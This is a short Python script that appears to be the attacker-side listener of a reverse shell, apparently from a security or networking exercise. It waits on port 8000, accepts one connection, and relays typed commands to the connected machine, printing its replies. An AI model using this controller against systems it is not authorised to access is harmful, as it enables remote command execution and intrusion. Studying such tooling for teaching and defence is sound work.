from socket import *

serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(("", serverPort))
serverSocket.listen(1)

print("Attacker box listening and awaiting instructions")

connectionSocket, addr = serverSocket.accept()
print("Thanks for connecting to me " + str(addr))

# Initial message from client
message = connectionSocket.recv(1024).decode()  # Added decode()
print(message)

command = ""
while command.lower() != "exit":  # Added .lower() for case-insensitive check
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode())
    if command.lower() == "exit":
        break  # Exit loop immediately after sending exit command
    message = connectionSocket.recv(1024).decode()
    print(message)

# Close connection properly
connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
